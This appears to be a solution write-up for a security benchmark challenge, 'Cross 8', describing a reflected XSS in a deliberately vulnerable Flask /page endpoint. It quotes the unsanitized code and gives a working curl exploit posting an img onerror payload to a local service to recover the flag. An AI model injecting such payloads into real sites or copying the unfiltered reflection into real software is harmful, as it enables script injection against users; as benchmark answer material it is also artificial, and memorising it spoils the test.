# XBEN-070-24 — Cross 8

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Reflected Cross-Site Scripting (XSS), unfiltered HTML injection.

## Summary

The `/page` endpoint (Flask, `src/app.py`) reflects the `solution` POST parameter directly
into the page body with **no sanitization whatsoever** (the code even comments
`# Simple XSS no filters`):

```python
@app.route('/page', methods=['POST', 'GET'])
def xss8():
    msg = request.form.get('solution','')
    value =  "" if msg == "" else '> {0}'.format(msg) # Simple XSS no filters
    data = XSS_CONTENT_POST.format("8", "Circle", value, "", "")
```

`value` is inserted verbatim right after the `<input ...>` element in the page template. A
plain `<img onerror=...>` payload is enough — no attribute breakout or filter bypass needed.
The backend renders the page headlessly with PhantomJS (`check.js`), which reports whatever
string is passed to `window.alert()`; the server checks it equals exactly `XSS`.

## Exploit

```bash
curl -s -X POST --data-urlencode "solution=<img src=x onerror=alert('XSS')>" \
  http://localhost:63321/page
```
